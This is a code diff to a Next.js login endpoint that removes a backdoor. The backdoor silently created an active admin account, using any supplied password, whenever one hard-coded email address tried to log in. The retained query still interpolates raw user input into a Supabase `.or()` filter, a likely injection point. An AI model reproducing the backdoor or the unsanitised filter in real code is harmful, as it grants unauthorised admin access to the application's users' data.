@@ -12,30 +12,11 @@ export async function POST(req: NextRequest) {
     const u = String(username || "").trim().toLowerCase();
     const supabase = createAdminClient();
 
-    let { data: user } = await supabase
+    const { data: user } = await supabase
     .from("team_members")
     .select("id, username, password, name, is_admin, status")
     .or(`username.eq.${u},email.eq.${u}`)
     .single();
-
-  if (!user && u === "baciraro@gmail.com") {
-    const hashed = bcrypt.hashSync(password, 10);
-    const { data: newUser, error } = await supabase
-      .from("team_members")
-      .insert({
-        name: "Admin",
-        role: "Founder",
-        division: "founder",
-        username: u,
-        email: u,
-        password: hashed,
-        is_admin: true,
-        status: "active",
-      })
-      .select()
-      .single();
-    if (!error && newUser) user = newUser;
-  }
 
   if (
     !user ||
